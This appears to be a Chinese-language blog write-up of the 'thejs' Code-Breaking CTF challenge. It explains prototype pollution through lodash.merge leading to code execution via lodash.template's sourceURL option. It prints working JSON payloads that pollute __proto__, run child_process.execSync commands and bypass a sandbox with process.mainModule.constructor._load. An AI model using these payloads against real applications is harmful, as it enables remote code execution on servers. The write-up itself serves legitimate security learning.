---
title: code breaking thejs
date: 2020-12-30 21:14:28
updated: 2020-12-30 21:14:28
categories: Write up
---

复现了下P神小密圈Code breaking 挑战赛的js题`hard - thejs` <!--more-->



源码：https://github.com/phith0n/code-breaking/tree/master/2018/thejs

如果想要修改父对象的原型，有如下两种方式

1. `inst.constructor.prototype`
2. `inst.__proto__`
   那么推广一下的话，又有如下两种方式
3. `inst[constructor][prototype][]`
4. `inst[__proto__][]`
   所以也就是说只要找对数组进行操作的地方，我们就有可能完成对原型的污染。但是还要注意的是想办法赋值的`__proto__`对象并不是真正的这个对象，所以想要写到真正的`__proto__`中，我们需要一层赋值。

---



初始页面

![](https://img.npfs06.top/20210405154241.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

审计代码,关键点如下

![](https://img.npfs06.top/20210405160347.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞，会直接将注入原型的属性的值写去最底层的object。我们需要找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。

发现页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中

![](https://img.npfs06.top/20210405160750.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

恰好发现vscode提示sourceURLs,那就跟踪到这个函数看一下

https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js

![](https://img.npfs06.top/20210405161121.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



可以看到options是一个对象，sourceURL是通过赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。

如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。

继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：

![](http://img.npfs06.top/20210405161520.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



通过构造chile_process.exec()就可以执行任意代码了。

我们可以这么利用

```
new Function("","//# sourceURL='xxx'\r\n CODE \r\n")();
```

本来构造的是

```
global.require("child_process").execSync("whoami").toString()
```

但是此题环境中有沙箱对此进行了限制，因此如下payload是无法成功的。需要对沙箱环境进行bypass

```
{"__proto__" : {"sourceURL" : "\r\nreturn e = () => {for (var a in {}){delete Object.prototype[a];}return global.require('child_process').execSync('whoami').to
```

最终paylaod如下

```
{"__proto__" : {"sourceURL" : "\r\nreturn e = () => {for (var a in {}){delete Object.prototype[a];}return global.process.mainModule.constructor._load('child_process').execSync('ls').toString()}\r\n"}}
```

注意下content-type要改成application/json

![](http://img.npfs06.top/20210405165225.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)